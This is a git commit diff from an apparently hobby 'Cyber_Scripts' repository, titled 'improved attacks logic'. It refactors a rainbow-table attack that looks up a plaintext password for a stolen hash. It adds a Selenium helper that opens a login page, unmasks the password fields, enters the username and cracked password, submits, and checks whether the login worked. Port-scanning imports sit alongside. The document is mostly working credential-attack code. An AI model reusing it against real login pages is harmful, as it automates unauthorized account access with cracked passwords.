27be7acc17dac6ac415fbcda40021c9a2d1ce889
AmitHayoun <amithayoun0@gmail.com>
2023-09-25 18:30:40 +0300

    improved attacks logic

--- Cyber_Scripts/Rainbow Table.py
+++ Cyber_Scripts/Rainbow Table.py
@@ -2,6 +2,7 @@ import rainbowtables as rt
 import time
 from selenium import webdriver
 from selenium.webdriver.common.by import By
+from Cyber_Scripts import *
 
 
 def create_table(wordlists, path="/rainbow_tables", file_name="rainbow_table", hash_type="sha256"):
@@ -22,7 +23,7 @@ def hash_lookup(hashed, table="rainbow_table"):
     return lookup
 
 
-def execute(login_url, user_name, hashed, table="rainbow_table"):
+def execute(login_page_url, user_name, hashed, table="rainbow_table"):
     # table creation should happen prior to execution ??
 
     # extract relevant username and hashed password from db or from GUI
@@ -31,50 +32,5 @@ def execute(login_url, user_name, hashed, table="rainbow_table"):
     fake_password = hash_lookup(hashed, table)
 
     # lookup successful -> go through login flow
-    # open up login page
-    driver_url = login_url
-
-    driver = webdriver.Chrome()
-    driver.get(driver_url)
-
-    time.sleep(1)  # wait for the page to load
-
-    # Find and fill the fields with desired values
-    input_elements = driver.find_elements(By.TAG_NAME, "input")
-    input_elements = [element for element in input_elements if element.is_displayed()]
-
-    for i in range(2):
-        name = input_elements[i].get_attribute("name")
-        # print("name: " + name)
-        script = f"document.getElementsByName('{name}')[0].type = 'text';"
-        driver.execute_script(script)
-
-    # input username and plaintext
-    input_elements[0].send_keys(user_name)  # Enter the username
-    input_elements[1].send_keys(fake_password)  # Enter password
-
-    # Find and click the submit button
-    button_elements = driver.find_elements(By.TAG_NAME, "button")
-    button_elements = [element for element in button_elements if element.is_displayed() and
-                       (element.get_attribute("type") == "submit" or
-                        element.get_attribute("disabled type") == "submit")]
-    if len(button_elements) == 0:
-        button_elements = input_elements
-        button_elements = [element for element in button_elements if element.is_displayed() and
-                           (element.get_attribute("type") == "submit" or
-                            element.get_attribute("disabled type") == "submit")]
-
-    # perform login
-    button_elements[-1].click()
-
-    time.sleep(1)  # wait for the page to load
-
-    driver.quit()
-
-    # lookup failed -> abort
-    new_url = driver.current_url
-    passed = driver_url != new_url
-
-    # Close the browser window
-    driver.quit()
-    return passed
+    # try to login
+    return enter_login_input(login_page_url, user_name, fake_password)
--- Cyber_Scripts/__init__.py
+++ Cyber_Scripts/__init__.py
@@ -1,9 +1,14 @@
 # import nmap3
 import nmap
 from scapy.all import *
+from selenium import webdriver
+from selenium.webdriver.common.by import By
 import socket as s
 from datetime import datetime
 from deprecated import deprecated
+from selenium.webdriver.common.action_chains import ActionChains
+from selenium.common import UnexpectedAlertPresentException
+from selenium.webdriver.common.keys import Keys
 
 # variables
 # path to the output file
@@ -52,5 +57,61 @@ def port_discovery(address = "127.0.0.1"):
             print((end-start)/60)
             return allports
 
+# Easier to change the browser here in case of an error
+def create_driver(page_url):
+    driver = webdriver.Edge()
+    driver.get(page_url)
+    time.sleep(1)  # wait for the page to load
+    return driver
+def enter_login_input(login_page_url, user_name, password):
+    driver = create_driver(login_page_url)
 
-# port_discovery("facebook.com")
+    # Find and fill the fields with desired values
+    input_elements = driver.find_elements(By.TAG_NAME, "input")
+    input_elements = [element for element in input_elements if element.is_displayed()]
+
+    for i in range(2):
+        name = input_elements[i].get_attribute("name")
+        # print("name: " + name)
+        script = f"document.getElementsByName('{name}')[0].type = 'text';"
+        driver.execute_script(script)
+
+    # Find and click the submit button
+    button_elements = driver.find_elements(By.TAG_NAME, "button")
+    button_elements = [element for element in button_elements if element.is_displayed() and
+                       (element.get_attribute("type") == "submit" or
+                        element.get_attribute("disabled type") == "submit")]
+    if len(button_elements) == 0:
+        button_elements = input_elements
+        button_elements = [element for element in button_elements if element.is_displayed() and
+                           (element.get_attribute("type") == "submit" or
+                            element.get_attribute("disabled type") == "submit")]
+    input_elements[0].send_keys(user_name)
+    input_elements[1].send_keys(password)
+
+    # perform login
+    button_elements[-1].click()
+
+    time.sleep(1)  # wait for the page to load
+
+    try:
+        actions = ActionChains(driver)
+        actions.send_keys(Keys.ESCAPE)  # Escape popups
+        actions.perform()
+    except UnexpectedAlertPresentException:
+        alert = driver.switch_to.active_element  # closing the popup
+
+    # lookup failed -> abort
+    try:
+        new_url = driver.current_url
+        passed = login_page_url != new_url
+        return passed
+    except:
+        pass
+    finally:
+        # Close the browser window
+        driver.quit()
+
+    # return driver, input_elements[0], input_elements[1], button_elements[-1]
+
+
